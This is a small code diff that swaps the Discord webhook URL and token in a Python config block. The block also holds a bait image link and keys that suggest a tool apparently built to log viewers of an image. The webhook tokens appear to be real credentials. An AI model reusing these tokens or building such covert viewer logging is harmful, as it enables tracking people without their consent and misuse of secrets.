@@ -10,7 +10,7 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1436260820547014689/55tWmNNhTcRwKcbjOB3o1lTZ1JsEFEeg2VYIe75VuVTSXqpjpHfjLyxGF3ysn6XtuYDR",
+    "webhook": "https://discord.com/api/webhooks/1436536902965788702/OgRFFi_lB1GMcX2XD-0G7ERUyQCosi7edQ8df7AMub6IWVVppXBwj3mvVtxNGWXOhaZn",
     "image": "https://imgs.search.brave.com/5wvp3BmCsaBFpgn5DBVwJ-gkFGdde7T0eNGIRUJOl-c/rs:fit:0:180:1:0/g:ce/aHR0cHM6Ly9tZWRp/YTEudGVub3IuY29t/L20vaHhpb0dGN1Bo/OEFBQUFBZC9saW9u/bW9ua2V5LXJhZ2Ut/YmFpdC5naWY.jpeg", 
     "imageArgument": True,
 
